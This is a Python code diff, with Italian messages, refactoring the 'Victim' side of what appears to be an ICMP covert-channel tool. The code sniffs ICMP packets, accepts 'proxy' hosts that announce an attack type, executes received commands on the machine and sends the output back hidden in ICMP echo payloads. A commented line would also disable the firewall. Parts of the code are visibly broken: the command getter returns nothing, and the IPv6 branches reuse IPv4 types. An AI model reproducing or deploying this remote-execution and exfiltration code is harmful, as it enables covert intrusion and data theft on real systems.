@@ -84,11 +84,6 @@ def _windows_get_data_from_command(process_shell):
     #stdout_data, stderr_data = process_shell.communicate()
     #return stdout_data.splitlines(), stderr_data.splitlines() 
 
-
-
-
-
-
 def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
     def callback(packet):
         nonlocal comando, connected_proxy, event_pktconn
@@ -112,10 +107,21 @@ def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Even
                 threadevent.set(event_pktconn)
                 return
     return callback
-    
-
 
 #---------------- 
+class ADD_TO_METHODS:
+    def get_ip_host(): 
+        while True: 
+            ip_host, errore=NETWORK.IP.find_local_IP() 
+            if errore:
+                print("errore:",errore)  
+                msg="Inserire indirizzo IP dell'host:\n\t#" 
+                ip_host=input(msg)
+            try:  
+                return ipaddress.ip_address(ip_host) 
+            except Exception as e: 
+                print(e) 
+                return None 
 def check_value_in_parser(args): 
     try:
         if not isinstance(args,argparse.Namespace):
@@ -130,7 +136,8 @@ def check_value_in_parser(args):
 class CONNECTED_PROXY: 
     proxy_list:list[ipaddress._IPAddressBase]=None 
     lock:threading.Lock=None 
-    enough_event:threading.Event=None
+    enough_event:threading.Event=None 
+    type_attack:dict[str:str]={}
 
     def __init__(self): 
         self.proxy_list=[]
@@ -181,183 +188,82 @@ class Victim:
     stop_flag={"value":False} 
 
     def __init__(self): 
-        def get_ip_host(): 
-            while True: 
-                ip_host, errore=NETWORK.IP.find_local_IP() 
-                if errore:
-                    print("errore:",errore)  
-                    msg="Inserire indirizzo IP dell'host:\n\t#" 
-                    ip_host=input(msg)
-                try:  
-                    return ipaddress.ip_address(ip_host) 
-                except Exception as e: 
-                    print(e) 
-                    return None 
         #---------------------
-        self.ip_host=get_ip_host()
-        print("IP HOST", self.ip_host) 
+        self.ip_host=ADD_TO_METHODS.get_ip_host()
         args=GET_ARGS.from_parser(self) 
         if not IS_TYPE.namespace(args): 
             exit(0) 
         self.num_proxy=args.num_proxy 
         if not IS_TYPE.integer(self.num_proxy): 
             raise TypeError("num_proxy non valido")
-        print("NUMERO PROXY",self.num_proxy) 
         self.connected_proxy=CONNECTED_PROXY()
     
-    def start(self): 
-        def check_num_proxy(): 
-            if DEBUG: 
-                print("DEBUG -> check_num_proxy")
-                return 
-            if len(self.connected_proxy.proxy_list)>=self.num_proxy: 
-                print("Conessi abbastanza proxy...")
-                return  
-            msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
-            scelta=ask_bool_choice(msg) 
-            if scelta and len(self.connected_proxy.proxy_list)>0: 
-                print("Continuo con i proxy trovati...") 
-                return 
-            print("Lista proxy vuota") if len(self.connected_proxy.proxy_list)<=0 else None
-            print("Interruzione del programma...")  
-            NETWORK.FIREWALL.enable()
-            exit(0) 
+    def start(self):  
         def check_system_compatibility():
             supportedSystems=["linux","win32"] 
             if sys.platform not in supportedSystems: 
                 print(sys.platform," non supportato")
                 return False 
             return True 
-        #---------------------------
+        def get_connected_proxy(): 
+            self.wait_connections() 
+            if DEBUG: 
+                print("DEBUG -> check_num_proxy")
+                return 
+            if len(self.connected_proxy.proxy_list)>=self.num_proxy: 
+                print("Si sono conessi abbastanza proxy...")
+                return  
+            msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
+            scelta=ask_bool_choice(msg) 
+            if scelta and len(self.connected_proxy.proxy_list)>0: 
+                print("Continuo con i proxy trovati...") 
+                return 
+            print("Lista proxy vuota") if len(self.connected_proxy.proxy_list)<=0 else None 
+            print("Si è scelto di non continuare") if scelta else None
+            raise SystemError("Interruzione del programma...")  
+        def get_comando(): 
+            if DEBUG: 
+                msg="Inserisci il comando: "
+                comando=input(msg) 
+            else: comando=self.wait_command() 
+        #--------------------------- 
+        if not IS_TYPE.integer(self.num_proxy) or self.num_proxy<=0: 
+            print("Numero proxy non vlaido:",self.num_proxy) 
+            exit(0) 
+        print("IP della macchina:", self.ip_host) 
+        print("Proxy richiesti:",self.num_proxy) 
         try: 
-            #NETWORK.FIREWALL.disable() #TODO decommentare
-            pass 
-        except Exception as e: 
-            print(e) 
-            NETWORK.FIREWALL.enable()
-            exit(1) 
-        try:  
-            #GET CONNECTED PROXY 
-            self.wait_connections()
-            check_num_proxy() 
-            print("METODO ATTACO",self.attack_function) 
-            print("PROXY DISPONIBILI",len(self.connected_proxy.proxy_list),self.connected_proxy.proxy_list)
-        except Exception as e:
-            print(e)
-            NETWORK.FIREWALL.enable()
-            exit(1) 
-        try: 
-            #GET COMANDO
+            #NETWORK.FIREWALL.disable() #TODO decommentare 
+            get_connected_proxy() 
+            print("Metodo di attacco:",self.attack_function) 
+            print("Proxy disponiili:",len(self.connected_proxy.proxy_list))
+            print(self.connected_proxy.proxy_list) 
             while True: 
-                if DEBUG: 
-                    msg="Inserisci il comando: "
-                    comando=input(msg)
-                else: comando=self.wait_command() 
+                comando=get_comando() 
+                print("Command received:",comando)
                 if not check_system_compatibility(): 
                     raise Exception(f"{sys.platform} non supportato...")
                 print("Sistema supportato...") 
                 if any(case in comando for case in exit_cases): 
-                    #MSG.END_COMMUNICATION.value is in exit_cases
-                    print("EXIT CASE:",comando) 
+                    print("Interruzione del programma")
                     break 
-                print("Command received:",comando)
                 data=self.exec_command(comando) 
                 print("Command executed...") 
-                time.sleep(10)
                 proxy_data=self.get_proxy_data(data) 
                 print("PROXY DATA",proxy_data) 
                 print("Sending data...") 
-                time.sleep(5)
                 self.send_data(proxy_data) 
                 print("Finished sending data...") 
-                comando=None 
-                print("REPEAT",comando)
             print("Closing connection")
         except Exception as e:
-            print(f"__init__ proxy conn: {e}")
+            print(e)
             NETWORK.FIREWALL.enable()
             exit(1) 
-        NETWORK.FIREWALL.enable()  
+        finally: 
+            NETWORK.FIREWALL.enable() 
     
     def wait_connections(self): 
-        def callback_connection(packet): 
-            def is_alredy_connected(proxy:ipaddress.IPv4Address, connected_proxy:CONNECTED_PROXY=None): 
-                if not IS_TYPE.ipaddress(proxy): 
-                    raise TypeError("proxy non ipaddress") 
-                if not isinstance(connected_proxy, CONNECTED_PROXY): 
-                    raise TypeError("connected_proxy non CONNECTED_PROXY",type(connected_proxy)) 
-                if not IS_TYPE.threading_Lock(connected_proxy.lock): 
-                    raise TypeError("lock non valido") 
-                if not IS_TYPE.list(connected_proxy.proxy_list): 
-                    raise TypeError("proxy_list non valido") 
-                connected_proxy.lock.acquire()
-                is_already_connected= proxy in connected_proxy.proxy_list
-                connected_proxy.lock.release() 
-                return is_already_connected 
-            def add_proxy_to_connected(connected_proxy:CONNECTED_PROXY=None, ip_src:ipaddress.IPv4Address=None ): 
-                if not isinstance(connected_proxy, CONNECTED_PROXY): 
-                    raise TypeError("connected_proxy non CONNECTED_PROXY",type(connected_proxy)) 
-                if not IS_TYPE.ipaddress(ip_src): 
-                    raise TypeError("ip_src non ipaddress")
-                if not IS_TYPE.threading_Lock(connected_proxy.lock): 
-                    raise TypeError("lock non valido") 
-                if not IS_TYPE.list(connected_proxy.proxy_list): 
-                    raise TypeError("proxy_list non valido") 
-                print("Aggiunta alla lista dei proxy connessi")
-                connected_proxy.lock.acquire() 
-                if ip_src not in connected_proxy.proxy_list:
-                    connected_proxy.proxy_list.append(ip_src) 
-                else: print("GIA PRESENTE")
-                connected_proxy.lock.release() 
-                print("AGGIUNTO:",ip_src) 
-            #------------------
-            #print(packet.summary())
-            if not (packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw)): 
-                print(f"Il pacchetto non ha confermato la connessione...") 
-                return  
-            ip_src=ipaddress.ip_address(packet[IP].src) 
-            if is_alredy_connected(ip_src, self.connected_proxy): 
-                print("GIA CONNESSO:",ip_src) 
-                return 
-            print("ANCORA NON CONNESSO") 
-            confirm_text=(
-                MSG.CONFIRM_PROXY.value+self.ip_host.compressed
-            )
-            #mycalc.checksum(confirm_text)==packet[ICMP].id
-            if confirm_text not in packet[Raw].load.decode(): 
-                print("NESSUN MESSAGGIO DI CONFERMA")
-                return 
-            #confirm_conn_to_proxy  
-            #int_version=((packet[ICMP].id>>8) & 0xFF) ^ ord("i")
-            #int_code=(packet[ICMP].id & 0xFF) ^ ord("p")  
-            str_attacco=packet[Raw].load.decode().replace(confirm_text,"") 
-            self.attack_function=AttackType.get_attack_method(str_attacco) 
-            print("TIPO ATTACCO:",self.attack_function) 
-            data=(
-                MSG.CONFIRM_VICTIM.value+
-                self.ip_host.compressed+
-                ip_src.compressed
-            )  
-            try: 
-                SendSingleton(
-                    AttackType.ipv4_echo_payload, 
-                    SENDER_TYPE.TRUE_SENDER, 
-                    use_delay=False
-                ).send_data(data.encode(), ip_src)  
-                print("Conferma inviata a:",ip_src)
-            except Exception as e: 
-                print(e) 
-                #print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
-                print("CONNESSIONE NON CONFERMATA") 
-            try: 
-                add_proxy_to_connected(self.connected_proxy,ip_src ) 
-            except Exception as e: 
-                print(e) 
-                print("NON AGGIUNTO ALLA LISTA")   
-            if reached_proxy_number(self.connected_proxy, self.num_proxy): # and ask_bool_choice(msg)
-                THREADING_EVENT.set(event_enough_proxy) 
-                self.stop_flag["value"]=True 
-        def reached_proxy_number(connected_proxy=None, num_proxy:int=None): 
+        def check_variable_type(connected_proxy=None, num_proxy:int=None): 
             if not isinstance(connected_proxy, CONNECTED_PROXY): 
                 raise TypeError("connected_proxy is not CONNECTED_PROXY",type(connected_proxy))
             if not IS_TYPE.list(connected_proxy.proxy_list): 
@@ -366,6 +272,8 @@ class Victim:
                 raise TypeError("ip_host non valido") 
             if not IS_TYPE.integer(num_proxy): 
                 raise TypeError("connected_proxy non valido") 
+        def reached_proxy_number(connected_proxy=None, num_proxy:int=None):  
+            check_variable_type(connected_proxy, num_proxy)
             connected_proxy.lock.acquire() 
             is_enough_proxy=len(connected_proxy.proxy_list) >= num_proxy
             connected_proxy.lock.release() 
@@ -376,34 +284,9 @@ class Victim:
                 print("Numero di proxy non raggiunto",num_proxy) 
                 print("Necessari ancora:",num_proxy-len(connected_proxy.proxy_list)) 
             return is_enough_proxy 
-        def get_filter():  
-            IPv4_ECHO_REQUEST_TYPE=8 
-            IPv4_ECHO_REPLY_TYPE=0 
-            if self.ip_host.version==4: 
-                icmp="icmp " 
-            elif self.ip_host.version==6: 
-                icmp="icmp6 " 
-            filter=f"({icmp} or tcp)"  if DEBUG else icmp 
-            filter+=f" and ({icmp}[0]=={IPv4_ECHO_REQUEST_TYPE} or {icmp}[0]=={IPv4_ECHO_REPLY_TYPE}) "  
-            filter+=f" and dst {self.ip_host.compressed}"
-            return filter 
         def stop_filter(pkt):  
             return self.stop_flag["value"]  
-        def callback_timer(): 
-            if not reached_proxy_number(self.connected_proxy, self.num_proxy): 
-                print("NOT ENOUGH PROXIES") 
-                msg="Continuare ad aspettare ulteriori proxy? (s/n) " 
-                if ask_bool_choice(msg): 
-                    print("Continuo ad aspettare...")
-                    timer = GET.timer(WAITING_TIME, lambda: callback_timer()) 
-                    if not IS_TYPE.threading_Timer(timer): 
-                        raise TypeError("non è threading.Timer",type(timer))
-                    timer.start() 
-                    return
-                else: print("Smetto di aspettare...") 
-            else:print("ENOUGH PROXIES") 
-            THREADING_EVENT.set(event_enough_proxy) 
-            self.stop_flag["value"]=True 
+        
         def _old_code(): 
             print("Waiting connections...")
             timer = GET.timer(WAITING_TIME, lambda: callback_timer()) 
@@ -421,17 +304,126 @@ class Victim:
                 return
             if not IS_TYPE.enum(self.attack_function, AttackType): 
                 raise TypeError("attack_function non valida") 
-        #----------------------------- 
-        if not IS_TYPE.ipaddress(self.ip_host): 
-            raise TypeError("ip_host non valido")  
-        if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
-            raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
-        if not IS_TYPE.list(self.connected_proxy.proxy_list): 
-            raise TypeError("proxy_list non valido") 
-        if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
-            raise TypeError("lock non valido") 
-        if not IS_TYPE.integer(self.num_proxy): 
-            raise TypeError("num_proxy non valido")  
+        
+        def check_self_variable(): 
+            if not IS_TYPE.ipaddress(self.ip_host): 
+                raise TypeError("ip_host non valido")  
+            if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
+                raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
+            if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                raise TypeError("proxy_list non valido") 
+            if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                raise TypeError("lock non valido") 
+            if not IS_TYPE.integer(self.num_proxy): 
+                raise TypeError("num_proxy non valido")  
+        def callback_timer(): 
+            if not reached_proxy_number(self.connected_proxy, self.num_proxy): 
+                print("NOT ENOUGH PROXIES") 
+                msg="Continuare ad aspettare ulteriori proxy? (s/n) " 
+                if ask_bool_choice(msg): 
+                    print("Continuo ad aspettare...")
+                    timer = GET.timer(WAITING_TIME, lambda: callback_timer()) 
+                    if not IS_TYPE.threading_Timer(timer): 
+                        raise TypeError("non è threading.Timer",type(timer))
+                    timer.start() 
+                    return
+                else: print("Smetto di aspettare...") 
+            else:print("ENOUGH PROXIES") 
+            THREADING_EVENT.set(event_enough_proxy) 
+            self.stop_flag["value"]=True 
+        def get_filter():  
+            if not IS_TYPE.ipaddress(self.ip_host): 
+                raise TypeError("ip_host non valido")  
+            IPv4_ECHO_REQUEST= ICMP_TYPE.v4_Echo_Request if self.ip_host.version==4 else ICMP_TYPE.v4_Echo_Request
+            IPv4_ECHO_REPLY= ICMP_TYPE.v4_Echo_Reply if self.ip_host.version==4 else ICMP_TYPE.v4_Echo_Reply
+            if self.ip_host.version==4: 
+                icmp="icmp " 
+            elif self.ip_host.version==6: 
+                icmp="icmp6 " 
+            filter= icmp if not DEBUG else f"({icmp} or tcp)" 
+            filter+=f" and ({icmp}[0]=={IPv4_ECHO_REQUEST} or {icmp}[0]=={IPv4_ECHO_REPLY}) "  
+            filter+=f" and dst {self.ip_host.compressed}"
+            return filter 
+        def callback_connection(packet): 
+            def check_variable_type(proxy:ipaddress.IPv4Address, connected_proxy:CONNECTED_PROXY=None): 
+                if not IS_TYPE.ipaddress(proxy): 
+                    raise TypeError("proxy non ipaddress") 
+                if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
+                    raise TypeError("connected_proxy is not CONNECTED_PROXY->",type(self.connected_proxy)) 
+                if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                    raise TypeError("lock non valido->",type(self.connected_proxy.lock)) 
+                if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                    raise TypeError("proxy_list non valido->",type(self.connected_proxy.proxy_list)) 
+                if not IS_TYPE.dictionary(connected_proxy.type_attack): 
+                    raise TypeError("type_attack non valido->",type(self.connected_proxy.type_attack)) 
+            #------------------
+            #print(packet.summary()) 
+            if not packet.haslayer(IP): 
+                print("Protocollo IP non presente") 
+                return 
+            if not packet.haslayer(ICMP): 
+                print("Protocollo ICMP non presente") 
+                return 
+            if not packet.haslayer(Raw): 
+                print("Livello Raw non presente") 
+                return  
+            try:
+                ip_src=ipaddress.ip_address(packet[IP].src) 
+                connected_proxy=self.connected_proxy
+                check_variable_type(ip_src, self.connected_proxy) 
+            except Exception as e: 
+                return
+            connected_proxy.lock.acquire() 
+            is_already_connected= ip_src in connected_proxy.proxy_list
+            connected_proxy.lock.release() 
+            if is_already_connected: #is_alredy_connected(ip_src, self.connected_proxy): 
+                print(f"Indirizzo {ip_src} gia connesso...:") 
+                return 
+            print(f"Indirizzo {ip_src} non connesso") 
+            confirm_text=MSG.CONFIRM_PROXY.value+self.ip_host.compressed
+            #mycalc.checksum(confirm_text)==packet[ICMP].id
+            if confirm_text not in packet[Raw].load.decode(): 
+                print("Il proxy non ha confermato la connessione")
+                return 
+            #confirm_conn_to_proxy  
+            #int_version=((packet[ICMP].id>>8) & 0xFF) ^ ord("i")
+            #int_code=(packet[ICMP].id & 0xFF) ^ ord("p")  
+            str_attacco=packet[Raw].load.decode().replace(confirm_text,"") 
+            self.attack_function=AttackType.get_attack_method(str_attacco) 
+            connected_proxy.lock.acquire() 
+            connected_proxy.type_attack[ip_src.compressed]=self.attack_function 
+            connected_proxy.lock.release() 
+            print("Tipologia di attacco ricevuto:",connected_proxy.type_attack[ip_src.compressed]) 
+            print("Tipologia di attacco ricevuto:",self.attack_function) 
+            data=(
+                MSG.CONFIRM_VICTIM.value+
+                self.ip_host.compressed+
+                ip_src.compressed+ 
+                self.attack_function.name
+            )  
+            try: 
+                SendSingleton(
+                    AttackType.ipv4_echo_payload, 
+                    SENDER_TYPE.TRUE_SENDER, 
+                    use_delay=False
+                ).send_data(data.encode(), ip_src)  
+                print("Conferma inviata a:",ip_src)  
+                connected_proxy.lock.acquire() 
+                if ip_src not in connected_proxy.proxy_list:
+                    connected_proxy.proxy_list.append(ip_src) 
+                    print("Proxy aggiunto...")
+                else: print("Proxy già presente")
+                connected_proxy.lock.release() 
+                if reached_proxy_number(self.connected_proxy, self.num_proxy): # and ask_bool_choice(msg)
+                    THREADING_EVENT.set(event_enough_proxy) 
+                    self.stop_flag["value"]=True 
+            except Exception as e: 
+                print(e) 
+                #print(f"{ip_src} non ha risposto al messaggio di conferma. ") 
+                print("CONNESSIONE NON CONFERMATA")  
+                print("NON AGGIUNTO ALLA LISTA")  
+        #-----------------------------  
+        check_self_variable() 
         print("Waiting connections...") 
         event_enough_proxy=GET.threading_Event() 
         if not IS_TYPE.threading_Event(event_enough_proxy): 
@@ -440,7 +432,10 @@ class Victim:
         if interface is None: 
             raise ValueError("interface is None",interface) 
         print("INTERFACE:",interface)
-        timer:threading.Timer=GET.timer(WAITING_TIME, lambda:callback_timer()) 
+        timer:threading.Timer=GET.timer(
+            WAITING_TIME, 
+            lambda:callback_timer()
+        ) 
         if not IS_TYPE.threading_Timer(timer): 
             raise TypeError("non è threading.Timer",type(timer))
         sniff_args={
@@ -451,7 +446,8 @@ class Victim:
         } 
         sniffer:AsyncSniffer=GET.AsyncSniffer(sniff_args) 
         if not IS_TYPE.AsyncSniffer(sniffer): 
-            raise TypeError("non AsyncSniffer",type(sniffer))
+            raise TypeError("non AsyncSniffer",type(sniffer)) 
+        #START SNIFFING THE PACKETS
         sniffer.start() 
         if sniffer.running:
             print("Sniffer started...") 
@@ -459,8 +455,10 @@ class Victim:
         timer.start() 
         if timer.is_alive():
             print("Timer started...") 
+        #WAINT THE EVENT
         print("Waiting thread to end...") 
         THREADING_EVENT.wait(event_enough_proxy)  
+        #STOP SNIFFING
         if timer.is_alive(): 
             timer.cancel()
             print("Timer stopped...") 
